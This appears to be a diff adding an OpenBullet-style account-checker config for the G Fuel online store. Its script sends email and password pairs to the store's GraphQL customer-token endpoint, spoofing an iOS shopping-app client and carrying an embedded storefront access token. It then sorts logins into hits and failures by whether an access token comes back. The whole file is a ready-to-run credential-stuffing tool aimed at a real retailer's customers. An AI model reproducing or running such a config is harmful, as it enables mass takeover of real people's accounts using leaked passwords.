@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "Gfuel",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-15T08:19:00.0907577-05:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://gfuel.com/api/2020-04/graphql" 
+  CONTENT "mutation{customerAccessTokenCreate(input:{email:\"<USER>\",password:\"<PASS>\"}){customerAccessToken{accessToken,expiresAt},customerUserErrors{field,message}}}" 
+  CONTENTTYPE "application/graphql" 
+  HEADER "Host: gfuel.com" 
+  HEADER "Accept: application/json" 
+  HEADER "X-Query-Tag: b20ebe3817828821f55cf32e0571b9e2" 
+  HEADER "X-SDK-Variant: ios" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "X-Shopify-Storefront-Access-Token: 21765aa7568fd627c44d68bde191f6c0" 
+  HEADER "Accept-Language: " 
+  HEADER "Content-Type: application/graphql" 
+  HEADER "X-SDK-Version: 4.0.0" 
+  HEADER "User-Agent: Mobile Buy SDK iOS/4.0.0/com.aeron.gfuel" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 184" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+  KEYCHAIN Failure OR 
+    KEY "Unidentified customer" 
+
